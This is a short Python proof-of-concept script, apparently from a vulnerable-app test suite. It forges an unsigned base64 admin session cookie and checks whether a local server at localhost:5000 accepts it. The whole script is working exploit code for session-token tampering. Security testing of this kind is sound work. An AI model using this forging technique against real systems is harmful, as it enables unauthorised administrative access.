#!/usr/bin/env python3
"""Attack 3: Session Forging (Session Cookie Tampering).

Forges an unsigned base64 administrative session token.
"""

import base64

import requests

BASE_URL = "http://localhost:5000"


def test_attack_3():
    print("[+] Running Individual Attack 3: Session Forging...")
    # Forge admin cookie: admin:admin:timestamp
    forged_token = base64.b64encode(b"admin:admin:9999999999").decode("utf-8")
    cookies = {"session_token": forged_token}
    url = f"{BASE_URL}/api/users/me"
    try:
        response = requests.get(url, cookies=cookies, timeout=5)
        print(f"[*] GET {url} with forged cookie - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Vulnerability confirmed! Admin session accepted:")
            print(response.json())
        else:
            print(f"[!] Authentication rejected: {response.text}")
    except Exception as e:
        print(f"[X] Connection error: {e}")


if __name__ == "__main__":
    test_attack_3()
